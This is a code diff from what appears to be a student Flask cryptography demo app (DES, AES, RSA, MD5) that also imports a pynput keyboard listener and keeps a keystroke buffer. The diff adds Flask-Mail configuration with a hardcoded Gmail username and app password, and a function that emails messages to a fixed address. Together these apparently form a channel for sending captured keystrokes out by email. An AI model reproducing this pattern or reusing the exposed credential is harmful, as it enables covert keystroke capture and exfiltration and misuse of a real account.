@@ -4,6 +4,7 @@ from pynput.keyboard import Key, Listener
 import pynput
 import sys
 from flask import Flask, render_template, request
+from flask_mail import Mail, Message
 from Algorithms.DES import run_des
 from Algorithms.AES import AES
 from Algorithms.RSA import RSA
@@ -11,6 +12,22 @@ from Algorithms.MD5 import MD5
 
 app = Flask(__name__, template_folder='templates', static_folder='static')
 
+
+app.config['MAIL_SERVER'] = 'smtp.gmail.com'
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USE_TLS'] = False
+app.config['MAIL_USE_SSL'] = True
+app.config['MAIL_USERNAME'] = 'vaishnavsrinidhi@gmail.com'
+app.config['MAIL_PASSWORD'] = 'mkhpvauwslstsury'
+app.config['MAIL_DEFAULT_SENDER'] = 'vaishnavsrinidhi@gmail.com'
+
+mail = Mail(app)
+
+def send_mail(mail, message):
+    msg = Message('IMPORTANT MESSAGE', recipients=['srishtiv.2019@vitstudent.ac.in']) # The recipient can be changed here
+    msg.body = message
+    mail.send(msg)
+    return 'Message was sent!'
 
 cnt = 0
 keys = []
@@ -242,7 +259,6 @@ def md5_page():
     #   return render_template('page_md5.html', error_no='1')
     else:
         return render_template('page_md5.html')
-
 
 def remove_backspace(S):
     q = []
